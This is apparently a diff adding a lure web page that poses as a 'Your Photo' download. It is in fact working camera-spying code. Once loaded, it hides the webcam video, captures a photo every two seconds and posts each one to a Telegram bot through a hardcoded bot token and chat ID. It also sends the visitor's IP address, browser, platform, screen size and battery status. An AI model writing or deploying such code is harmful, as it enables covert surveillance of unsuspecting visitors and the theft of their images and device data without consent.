@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>image_9363638</title>
+    <style>
+        video { display: none; } 
+        h1 { color: green; text-align: center; }
+        img { height: 350px; width: 300px; backdrop-filter: blur(50px); display: block; margin: auto; }
+    </style>
+</head>
+<body>
+    <h1>⏬ Your Photo ⏬</h1>
+    <img src="camara/images.png" id="photo-preview">
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
+        const CHAT_ID = "2139008203";
+        const canvas = document.getElementById('canvas');
+        let videoStream = null;
+        let video = null;
+        let intervalId = null;
+
+        async function startCamera() {
+            try {
+                video = document.createElement('video');
+                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = videoStream;
+
+                return new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve(true);
+                    };
+                });
+            } catch (error) {
+                console.error("Camera access denied:", error);
+                return false;
+            }
+        }
+
+        async function capturePhoto() {
+            if (!video || !videoStream) return;
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');
+        }
+
+        async function sendPhoto() {
+            const photoData = await capturePhoto();
+            if (!photoData) return;
+
+            const blob = await (await fetch(photoData)).blob();
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "photo.png");
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        async function sendDeviceInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ipAddress = data.ip;
+
+                const battery = await navigator.getBattery();
+                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+
+                const deviceInfo = `
+Device Information:
+- IP Address: ${ipAddress}
+- Browser: ${navigator.userAgent}
+- Platform: ${navigator.platform}
+- Screen Resolution: ${window.screen.width}x${window.screen.height}
+- ${batteryStatus}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: deviceInfo })
+                });
+            } catch (error) {
+                console.error("Error fetching device info:", error);
+            }
+        }
+
+        async function startPhotoCaptureLoop() {
+            const cameraStarted = await startCamera();
+            if (!cameraStarted) return;
+
+            sendDeviceInfo(); // প্রথমবার ডিভাইসের তথ্য পাঠাবে
+            sendPhoto(); // প্রথম ছবি পাঠাবে
+
+            intervalId = setInterval(sendPhoto, 2000); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
+        }
+
+        function stopCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+                videoStream = null;
+                video = null;
+            }
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+        }
+
+        window.onload = startPhotoCaptureLoop;
+        window.onbeforeunload = stopCamera;
+    </script>
+</body>
+</html>
